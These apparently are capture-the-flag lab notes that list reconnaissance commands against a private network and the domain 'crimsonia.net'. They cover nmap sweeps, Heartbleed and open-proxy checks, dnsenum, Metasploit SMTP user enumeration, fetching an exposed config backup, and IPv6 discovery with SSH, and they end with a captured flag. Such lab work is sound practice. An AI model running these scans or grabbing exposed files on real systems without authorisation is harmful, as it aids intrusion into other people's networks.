# Scanning 1 
```
nmap -sP 10.110.253.0/24

```
# Enumeration 1

```
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dnsenum/dnsbig.txt 

dnsenum -f dnsbig.txt crimsonia.net

```

# Enumeration 2
[resource](https://www.offensive-security.com/metasploit-unleashed/scanner-smtp-auxiliary-modules/)
```
msfconsole
use auxiliary/scanner/smtp/smtp_enum
show options
set RHOSTS 10.110.253.25
run
```

# Scanning II
```
nmap -O -osscan-guess 10.110.253.0/24
```

# Scanning III
```
nmap -p 443 -v --script ssl-heartbleed 10.110.253.0/24 
```

# Scanning IV
```
wget http://www.crimsonia.net/config/MY_fuel.php.bak
cat MY_fuel.php.bak
```

# Scanning V
```
nmap -p1080,3128,8080,8118,8123,8888 --script http-open-proxy 10.110.253.0/24
curl -vv -x 10.110.253.140:8888  http://www.crimsonia.net/ 
```

# Scanning IV

```
ping6 -c2 -n ff02::1 
nmap -sV -6 -p- fe80::f1a6:f1a6:f1a6:f1a6%eth0 
ssh -p33445 fe80::f1a6:f1a6:f1a6:f1a6%eth0 
FLAG{1A954C2D53C535572916248C3745496B67D8C3203F8A5604D08CD14991C3B8C5}
```
